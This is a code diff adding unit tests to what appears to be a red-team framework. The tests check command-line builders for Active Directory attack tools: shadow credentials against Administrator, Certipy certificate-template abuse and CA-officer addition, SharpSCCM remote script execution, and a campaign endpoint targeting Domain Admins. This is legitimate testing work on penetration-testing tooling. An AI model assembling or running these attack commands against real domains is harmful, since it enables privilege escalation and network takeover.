@@ -147,3 +147,77 @@ def test_api_builders_preview() -> None:
     body = res.json()
     assert body["argv"][0] == "SharpSCCM.exe"
     assert "get" in body["argv"]
+
+
+def test_shadowcreds_builder() -> None:
+    from redstrike.builders import ShadowCredentialsBuilder
+
+    argv = ShadowCredentialsBuilder().pywhiskey(
+        target="dc01.cadre.local",
+        target_user="Administrator",
+        username="hunter",
+        password=SecretStr("pass123"),
+        domain="cadre.local",
+        action="add",
+    )
+    assert argv[:2] == ["pywhiskey", "-target"]
+    assert "Administrator" in argv
+    assert "-action" in argv and "add" in argv
+
+
+def test_certipy_unpac_and_template() -> None:
+    builder = CertipyBuilder()
+    auth_argv = builder.auth(pfx="admin.pfx", unpac_hash=True, dc_ip="192.168.77.10")
+    assert "-unpac-hash" in auth_argv
+    assert "-pfx" in auth_argv
+
+    tmpl_argv = builder.template(
+        template="CADRE-ESC4",
+        username="lead_eng",
+        password=SecretStr("pass"),
+        domain="cadre.local",
+        write_default=True,
+    )
+    assert "-write-default-configuration" in tmpl_argv
+
+    ca_argv = builder.ca(
+        ca="cadre-CA",
+        username="lead_eng",
+        password=SecretStr("pass"),
+        domain="cadre.local",
+        add_officer="analyst_t1",
+    )
+    assert "-add-officer" in ca_argv and "analyst_t1" in ca_argv
+
+
+def test_sharpsccm_extensions() -> None:
+    builder = SharpSCCMBuilder()
+    exec_argv = builder.exec_script(server="mbr02", script_body="whoami", device="WS01")
+    assert "-b" in exec_argv and "whoami" in exec_argv
+    assert "-d" in exec_argv and "WS01" in exec_argv
+
+    admin_argv = builder.adminservice_query(server="mbr02", endpoint="SMS_Application")
+    assert "adminservice" in admin_argv
+
+
+def test_teardown_queue() -> None:
+    from redstrike.runtime.teardown import TeardownQueue
+
+    queue = TeardownQueue()
+    queue.register("remove_cert", "dc01", ["rm", "cert.pfx"], "Remove forged cert", cleanup_func=lambda: True)
+    assert len(queue.pending) == 1
+    res = queue.execute_all()
+    assert res["total"] == 1
+    assert res["succeeded"] == 1
+    assert len(queue.pending) == 0
+
+
+def test_bloodhound_and_recommend_api() -> None:
+    client = TestClient(create_app(profile="campaign"))
+    bh_res = client.post("/bloodhound/query", json={"query": "MATCH (n) RETURN n LIMIT 5"})
+    assert bh_res.status_code == 200
+    assert bh_res.json()["status"] == "ok"
+
+    rec_res = client.post("/campaign/recommend", json={"engagement_id": "test", "objective": "Domain Admins"})
+    assert rec_res.status_code == 200
+    assert len(rec_res.json()["recommendations"]) >= 1
